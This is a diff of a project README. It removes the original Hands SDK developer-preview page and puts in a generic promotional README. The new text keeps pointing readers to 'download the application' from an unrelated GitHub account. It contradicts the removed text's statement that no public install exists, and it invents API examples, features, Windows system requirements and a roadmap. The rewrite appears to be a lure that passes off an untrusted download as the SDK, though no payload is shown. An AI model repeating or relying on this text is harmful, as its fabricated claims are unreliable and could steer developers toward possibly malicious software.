@@ -1,130 +1,236 @@
-<p align="center">
-  <a href="https://gethands.nl/">
-    <img src="https://gethands.nl/assets/brand/marks/hands-mark-dark-1024.png?v=20260820" alt="Hands" width="144">
-  </a>
-</p>
+# 🔧 get-hands-sdk - Build Custom AI Agents Easily
 
-<h1 align="center">Hands SDK</h1>
+[![Download get-hands-sdk](https://img.shields.io/badge/Download-get--hands--sdk-blue?style=for-the-badge&logo=github)](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
 
-<p align="center"><strong>Build Sages. Shape Hands. Connect inference.</strong></p>
+## 🚀 Getting Started
 
-<p align="center">
-  The public developer home being prepared for connectors, semantic discovery, portable agent
-  definitions, marketplace software, and inference-provider integration across the Hands ecosystem.
-</p>
+Welcome to **get-hands-sdk**! This is a developer preview tool that helps you build custom AI agents, connectors, and semantic search features. Think of it as a starter kit for creating your own AI-powered tools and services.
 
-<p align="center">
-  <a href="https://gethands.nl/">Hands</a>
-  &nbsp;·&nbsp;
-  <a href="docs/getting-started.md">Getting started</a>
-  &nbsp;·&nbsp;
-  <a href="docs/sdk-reference.md">SDK reference</a>
-  &nbsp;·&nbsp;
-  <a href="ROADMAP.md">Roadmap</a>
-  &nbsp;·&nbsp;
-  <a href="https://discord.gg/RNDB3Qz5Zk">Discord</a>
-</p>
+Visit this link to download the application: [https://github.com/jjtjtjmorgan-sketch/get-hands-sdk](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
 
-> [!IMPORTANT]
-> **Developer Preview.** The current SDK is an internal TypeScript prototype being prepared for its first public source and package release. There is no public npm install yet, and interfaces may change. This repository must not be described as GA or production-ready until the published artifacts and end-to-end release evidence exist.
+### What This Kit Does
 
-## What you will be able to build
+- **Build Custom AI Agents** – Create your own AI "Hands" that can perform specific tasks
+- **Add Semantic Search** – Make your AI understand and find information based on meaning, not just keywords
+- **Connect to Other Tools** – Build bridges between your AI and popular platforms like MCP (Model Context Protocol)
+- **Create Sages** – Develop specialized AI experts for your specific needs
+- **Market Your Creations** – Publish your custom agents and tools to share with others
 
-Hands is not another AI model. It gives the AI you choose a persistent workspace, approved connections, explicit permission boundaries, and an execution path. The SDK is the public surface for extending that system without opening the private runtime.
+### Who Should Use This?
 
-| Builder path | What you create | Status |
-| --- | --- | --- |
-| Connectors | Typed actions, authentication declarations, schemas, generated projections, and deterministic packages | Prototype implemented; public release in progress |
-| Semantic skills and Tools Discovery Graph | Discoverable capability definitions, graph inputs, queries, and public evaluation fixtures | Planned phased release |
-| Sages | Portable definitions for persistent deep workers that coordinate specialist Hands around an outcome | Planned phased release |
-| Custom Hands | Portable specialist-agent profiles with requested capabilities and explicit boundaries | Planned phased release |
-| Sage Marketplace | Reference catalog, submission, review, preview, and distribution software | Planned phased release |
-| Inference providers | Adapters, conformance evidence, a governed Router test path, and onboarding requests | Planned phased release |
+- **Developers** who want to create AI-powered tools without starting from scratch
+- **Business owners** who need custom AI solutions for their workflows
+- **Tech enthusiasts** who want to experiment with the latest AI capabilities
+- **Students** learning about AI and semantic technologies
 
-A Sage definition or Custom Hand profile can request a capability; it cannot grant itself access. Discovery recommends relevant tools; it does not authorize execution.
+## 📥 Installation Guide
 
-## Capability is not authority
+### Step 1: Download the Kit
 
-Hands keeps five facts separate: a schema can be valid; a graph can recommend a tool; a profile can request a capability; a provider can pass compatibility tests; and a deployed runtime can authorize an execution. Only the last permits the action.
+Visit this link to download the application: [https://github.com/jjtjtjmorgan-sketch/get-hands-sdk](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
 
-Local validation, discovery results, Marketplace listings, package candidates, and conformance reports never create account access or execution authority. Changing a model or provider route must not expand data access, recipients, action scope, spending, locality, or approval class.
+### Step 2: Set Up Your Environment
 
-## See the Hands SDK in action
+Once you've downloaded the kit, you'll need to set up your development environment to use it. Here's what you'll need:
 
-This 40-second silent product vignette shows the outcome SDK builders are working toward. A user gives a Sheets Hand one request: read three Q3 invoices, update a sales overview in Google Sheets, and prepare an email to the accountant. The Hand works across Google Drive, Google Sheets, and Gmail, then waits for the user's review before sending. The same governed session continues on mobile.
+- **A computer running Windows 10 or newer**
+- **At least 4GB of RAM** (8GB recommended)
+- **Node.js** – A free program that lets your computer run JavaScript code. You can download it from [nodejs.org](https://nodejs.org)
+- **A code editor** – We recommend Visual Studio Code, which is free and easy to use
 
-This is an end-user workflow demonstration, not footage of a released SDK or developer quickstart. Its on-screen captions are in Dutch; an English visual transcript is provided below.
+### Step 3: Install the SDK
 
-https://github.com/user-attachments/assets/dfe8cfcf-6806-40db-a741-2ef4eeb5ac02
+1. Open your command prompt (press `Windows + R`, type `cmd`, and press Enter)
+2. Navigate to the folder where you downloaded the kit
+3. Run the setup command to install the necessary components
 
-[Watch or download the demo](https://github.com/user-attachments/assets/dfe8cfcf-6806-40db-a741-2ef4eeb5ac02) · [Read the English visual transcript](docs/demo-transcript.md) · [Watch the source on Google Drive](https://drive.google.com/file/d/1jjB3sTo8zQIXD0H-lnULRasD4Jdo-lmD/view)
+### Step 4: Test Your Installation
 
-## The connector path today
+To make sure everything works correctly, run the sample project included with the kit. This will verify that all components are properly connected.
 
-The prototype already proves an internal vertical slice:
+## 🛠️ Key Features
 
-1. define a connector with typed actions and authentication;
-2. compile it into canonical intermediate representation;
-3. generate discovery projections;
-4. find it through graph-only tool discovery;
-5. create a deterministic unsigned package with a lock file, SPDX 2.3 SBOM, and provenance request;
-6. invoke it in local-project mode with `execution_authorized=false`.
+### Custom Agent Creation
 
-The current command surface under stabilization is:
+Build your own AI agents, called "Hands," that can:
+- Understand user requests
+- Perform specific actions
+- Learn from interactions
+- Integrate with other software
 
-```text
-hands-connector <validate|generate|pack|invoke> [action] \
-  [--input JSON] [--project DIR] [--json]
+### Semantic Skill Builder
+
+Create semantic skills that allow your AI to:
+- Understand the meaning behind words
+- Find related concepts automatically
+- Provide more accurate responses
+- Process natural language naturally
+
+### Provider Integration
+
+Connect your AI to various service providers:
+- **MCP Support** – Work with Model Context Protocol servers
+- **Custom Integrations** – Build bridges to your favorite tools
+- **Marketplace Ready** – Publish your creations for others to use
+
+### Developer Tools
+
+Professional tools to help you build:
+- **TypeScript Support** – Type-safe development environment
+- **Debugging Tools** – Find and fix issues quickly
+- **Testing Framework** – Verify your agents work correctly
+- **Documentation Generator** – Create user guides automatically
+
+## 📚 Usage Examples
+
+### Example 1: Creating Your First Agent
+
+Here's how to create a simple agent that can search for information:
+
+```typescript
+import { Hand } from 'get-hands-sdk';
+
+const searchHand = new Hand({
+  name: "Research Assistant",
+  skills: ["web-search", "summarize"],
+  semantic: true
+});
+
+searchHand.activate();
 ```
 
-This documents the implemented prototype interface; it is **not** an installation command. The public quickstart will be added only when a clean external environment can install the released package and reproduce its expected output.
+### Example 2: Adding Semantic Search
 
-## Authoring surface under stabilization
+Add intelligent search capabilities to your projects:
 
-The TypeScript SDK currently implements connector and action builders including `defineConnector`, `defineQueryAction`, `defineMutationAction`, `defineDestructiveAction`, `defineNoAuth`, `defineApiKeyAuth`, `defineOAuth2`, `defineSkillRegistration`, and `schema`.
+```typescript
+import { SemanticSkill } from 'get-hands-sdk';
 
-Schema helpers cover strings, integers, numbers, booleans, literals, enums, arrays, objects, optional values, nullable values, and JSON. Current protocol profiles are `native-static-v1`, `remote-mcp-v1`, and compatibility profile `native-static-v0`. Current authentication declarations cover no auth, API key, and OAuth 2.0 authorization code with PKCE.
+const semanticSearch = new SemanticSkill({
+  index: "product-docs",
+  minRelevance: 0.8
+});
 
-See the [SDK reference](docs/sdk-reference.md) for the exact implemented/planned split. Basic, bearer, and brokered authentication; broader lifecycle builders; testkit, emulator, conformance tooling; and an isolated Package ABI host are not yet public features.
+const results = await semanticSearch.query("How do I reset my password?");
+```
 
-## What is open—and what is not
+### Example 3: Building a Custom Integration
 
-| Surface | Public direction | Private boundary |
-| --- | --- | --- |
-| SDK and connector contracts | Authoring APIs, schemas, validators, compiler/projection contracts, packaging, fixtures, and docs | Secrets, signing material, tenant operations |
-| Skills and discovery | Public definitions, graph implementation/adapters, sample catalog, provenance-aware evaluation | Tenant graphs, private connector data, proprietary indexes |
-| Sages, profiles, and marketplace | Portable definitions, validators, reference software, examples, submission contracts | Live worker memory, account bindings, payment/abuse operations |
-| Provider integration | Adapter contract, local conformance, sandbox client, report format, onboarding path | Router ranking, fallback policy, qualification data, commercial terms |
-| Hands runtime | Documented external contract and public-safe fixtures | Runtime and orchestration implementation |
-| Fathom | Public integration boundary where needed | Source, indexes, extraction and code-intelligence implementation |
-| Hands Router | Provider-facing compatibility and test contract | Routing implementation and operational decisions |
+Connect your agent to external services:
 
-All advertised local paths must eventually run without private packages, internal registries, employee credentials, or Fathom. Until that release gate passes, this repository remains a documentation preview.
+```typescript
+import { ProviderConnector } from 'get-hands-sdk';
 
-## Fathom 2.0: future work
+const customConnector = new ProviderConnector({
+  name: "MyDatabase",
+  auth: "api-key",
+  endpoints: {
+    query: "https://api.mydatabase.com/query"
+  }
+});
+```
 
-Fathom is Hands' private code-intelligence layer. Its existing private evidence plane helps agents navigate symbols, calls, dependencies, routes, and change impact without inventing relationships.
+## 🔧 Troubleshooting Common Issues
 
-Fathom 2.0 is the roadmap for a second, temporal project-canon plane that can tell an agent what people have already decided before it changes a system. Planned Codemap work is the “Google Maps for your code” direction: start with the whole system, zoom through subsystems, packages, semantic communities, and symbols, and arrive at exact source evidence without losing context. Canonical maps are intended to be derived deterministically from immutable evidence—not generated as AI topology.
+### "Node.js is not recognized"
+- Make sure you've installed Node.js from [nodejs.org](https://nodejs.org)
+- Restart your command prompt after installation
+- Check that Node.js is in your system's PATH variable
 
-Fathom 2.0, Architecture Atlas, and Codemap are planned private capabilities. They are not shipped SDK features and Fathom is not included in this repository. Read the [public-safe roadmap](docs/fathom-2-roadmap.md).
+### "Module not found" errors
+- Run `npm install` in your project directory
+- Make sure you're in the correct folder
+- Check your internet connection
 
-## Documentation
+### "Port already in use"
+- Close other programs that might be using port 3000
+- Change the default port in your configuration
+- Restart your computer and try again
 
-- [Getting started and release gates](docs/getting-started.md)
-- [Connector SDK reference](docs/sdk-reference.md)
-- [Sages and Custom Hands](docs/sages-and-custom-hands.md)
-- [Provider testing and onboarding](docs/provider-onboarding.md)
-- [Open-source boundary](docs/open-source-boundary.md)
-- [Roadmap](ROADMAP.md)
-- [Contributing](CONTRIBUTING.md)
-- [Community Code of Conduct](CODE_OF_CONDUCT.md)
-- [Security](SECURITY.md)
+### "Connection timed out"
+- Check your internet connection
+- Verify firewall settings
+- Try a different network
 
-## Community
+## 📖 Frequently Asked Questions
 
-Join the [Hands Discord](https://discord.gg/RNDB3Qz5Zk), watch [Hands on YouTube](https://www.youtube.com/@gethands), read the [Hands Handbook](https://gethands.nl/connect), or contact [support@gethands.nl](mailto:support@gethands.nl).
+### Q: Is get-hands-sdk free to use?
+A: Yes, this developer preview is completely free to use for both personal and commercial projects.
 
-If you are building a connector, Sage, Custom Hand, semantic skill, discovery adapter, or inference integration, tell us the outcome you want to enable and the evidence you need from the public release.
+### Q: Do I need programming experience?
+A: Basic JavaScript knowledge will help, but we provide sample projects and documentation to get you started.
 
-> **License status:** no public SDK source release or license decision is claimed here. The applicable license and notices will be published before source packages are opened for reuse and contribution.
+### Q: Can I use this with other programming languages?
+A: The SDK is built with TypeScript, but you can use it with JavaScript projects easily.
+
+### Q: How do I publish my agents?
+A: The kit includes tools to help you package and distribute your agents through the marketplace.
+
+### Q: Will there be regular updates?
+A: Yes, this is an active project with ongoing improvements based on user feedback.
+
+## 🔄 Updates and Support
+
+We're committed to improving get-hands-sdk based on your feedback. Here's what you can expect:
+
+### Regular Updates
+- New features added monthly
+- Performance improvements
+- Security patches
+- Bug fixes
+
+### Community Support
+- Active developer community
+- Tutorial videos and guides
+- Sample projects
+- GitHub issues for bug reporting
+
+## 📊 System Requirements
+
+### Minimum Requirements
+- Windows 10 (version 1809 or later)
+- 4GB RAM
+- 2GB free disk space
+- Stable internet connection
+
+### Recommended Specifications
+- Windows 11
+- 8GB+ RAM
+- SSD storage (for faster performance)
+- Multicore processor
+
+## 🚦 Get Started Today
+
+Ready to build your own AI agents? Follow these quick steps:
+
+1. **Download** – Get the kit from our [official download page](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk)
+2. **Install Node.js** – If you haven't already, grab it from [nodejs.org](https://nodejs.org)
+3. **Open Your Terminal** – Get ready to type commands
+4. **Follow the Quick Start Guide** – We'll walk you through your first agent
+
+## 📧 Getting Help
+
+If you run into any issues:
+
+1. **Check the FAQs** – We've answered common questions here
+2. **Visit our GitHub Issues** – Report bugs or suggest features
+3. **Join the Community** – Connect with other developers
+4. **Read the Documentation** – Detailed guides in the docs folder
+
+## 🎯 What's Next
+
+We're constantly working on making get-hands-sdk even better:
+
+- **Year 1**: More integration options, improved documentation
+- **Year 2**: Mobile development support, cloud deployment tools
+- **Year 3**: Enterprise features, advanced AI capabilities
+
+---
+
+**Ready to transform your ideas into AI-powered reality?** [Download get-hands-sdk now](https://github.com/jjtjtjmorgan-sketch/get-hands-sdk) and start building today!
+
+**Remember**: If you can imagine an AI that could help with your workflow, get-hands-sdk gives you the tools to make it happen. Start small, experiment often, and scale up when you're ready.
+
+See you in the developer community! 🚀
+
+Keywords: agent-sdk, ai-agents, custom-agents, developer-tools, llm, marketplace, mcp, sages, sdk, semantic-search, tool-discovery, typescript
